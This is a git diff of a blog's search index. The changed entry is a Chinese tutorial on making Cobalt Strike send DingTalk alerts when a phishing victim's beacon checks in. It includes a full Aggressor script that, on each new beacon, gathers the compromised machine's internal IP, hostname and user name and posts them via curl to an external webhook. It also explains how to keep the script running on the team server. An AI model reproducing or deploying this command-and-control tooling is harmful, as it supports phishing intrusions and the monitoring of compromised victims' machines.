@@ -121,18 +121,19 @@ document.write(eval(name))  </code></pre><p>从浏览器获取name的值，然�
       </tags>
   </entry>
   <entry>
-    <title>cs上线钉钉提醒</title>
+    <title>CobaltStrike上线之钉钉提醒</title>
     <url>/2021/07/29/dingtalk_webhook/</url>
     <content><![CDATA[<blockquote>
 <p>平时钓鱼或者在吃饭的时候不能时刻盯着cs，原来一直使用<a href="https://sct.ftqq.com/sendkey">server酱</a>进行cs上线提醒，后续发现他开始收费了，那鱼儿上线后就无法及时进行维权。所以想通过钉钉webhook进行提醒</p>
 </blockquote>
-<p>效果如下：<br><img src="media/16275491678306/16275510645002.jpg" alt=""></p>
+<p>效果如下：</p>
+<p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/07/30/16275510645002.jpg" alt=""></p>
 <h2 id="搭建步骤"><a href="#搭建步骤" class="headerlink" title="搭建步骤"></a>搭建步骤</h2><h3 id="一-新建个人群聊"><a href="#一-新建个人群聊" class="headerlink" title="一.新建个人群聊"></a>一.新建个人群聊</h3><p>这个功能是群通知的功能，我们要建立个人群聊。<br>打开<code>手机版钉钉</code>-&gt;右上角点击<code>发起群聊</code>-&gt;<code>面对面建群</code><br>注意：电脑版的钉钉不可以！</p>
 <h3 id="二-接下来在群聊里新建webhook"><a href="#二-接下来在群聊里新建webhook" class="headerlink" title="二.接下来在群聊里新建webhook"></a>二.接下来在群聊里新建webhook</h3><p><code>点击设置</code>-<code>智能群助手</code>-<code>添加机器人</code>-<code>自定义</code></p>
-<p><img src="media/16275491678306/16275505505637.jpg" alt=""></p>
+<p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/07/30/16275505505637.jpg" alt=""></p>
 <p>接着进行对机器人添加<code>自定义关键词</code>=“CS”</p>
-<p><img src="media/16275491678306/16275506099188.jpg" alt=""></p>
-<h3 id="三-导入dingtalk-webhook-cna-到cs"><a href="#三-导入dingtalk-webhook-cna-到cs" class="headerlink" title="三.导入dingtalk_webhook.cna 到cs"></a>三.导入dingtalk_webhook.cna 到cs</h3><p>下载<a href="">dingtalk_webhook.cna</a>，修改dingtalk_webhookURL内容为自己的token<br><img src="media/16275491678306/16275522427259.jpg" alt=""></p>
+<p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/07/30/16275506099188.jpg" alt=""></p>
+<h3 id="三-导入dingtalk-webhook-cna-到cs"><a href="#三-导入dingtalk-webhook-cna-到cs" class="headerlink" title="三.导入dingtalk_webhook.cna 到cs"></a>三.导入dingtalk_webhook.cna 到cs</h3><p>下载<a href="">dingtalk_webhook.cna</a>，修改dingtalk_webhookURL内容为自己的token<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/07/30/16275522427259.jpg" alt=""></p>
 <p>代码如下：</p>
 <figure class="highlight http"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#author: 无尾熊/keyi</span><br><span class="line"></span><br><span class="line">#set this info:</span><br><span class="line"></span><br><span class="line">$dingtalk_webhookURL = &#x27;https://oapi.dingtalk.com/robot/send?access_token=【webhook的token】&#x27;;</span><br><span class="line"></span><br><span class="line">on beacon_initial &#123;</span><br><span class="line"></span><br><span class="line">    println(&quot;Initial Beacon Checkin: &quot; . $1 . &quot; PID: &quot; . beacon_info($1, &quot;pid&quot;));</span><br><span class="line">    local(&#x27;$internalIP $computerName $userName&#x27;);</span><br><span class="line">    $internalIP = replace(beacon_info($1, &quot;internal&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $computerName = replace(beacon_info($1, &quot;computer&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $userName = replace(beacon_info($1, &quot;user&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $message = &#x27;CobaltStrike上线提醒:\n&#x27;.$teamserver_hostname.&#x27;主机名称:&#x27;.$computerName.&#x27;\nUsername : &#x27;.$userName.&#x27;\nIpaddres : &#x27;.$internalIP;</span><br><span class="line"></span><br><span class="line">	@curl_command = @(&#x27;curl&#x27;,&#x27;-H&#x27;,&#x27;Content-Type: application/json&#x27;,&#x27;POST&#x27;,&#x27;--data&#x27;,&#x27;&#123;&quot;msgtype&quot;:&quot;text&quot;,&quot;text&quot;:&#123;&quot;content&quot;:&quot;CS&#x27;.$message.&#x27;&quot;&#125;&#125;&#x27;,$dingtalk_webhookURL) ;</span><br><span class="line">	exec(@curl_command);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h3 id="四-持续监控"><a href="#四-持续监控" class="headerlink" title="四.持续监控"></a>四.持续监控</h3><p>电脑断网后beacon上线后钉钉无提醒？<br>原因是：在cs客户端关闭后，加载的插件将无法运行，所以我们需要在cs的服务端去运行插件</p>
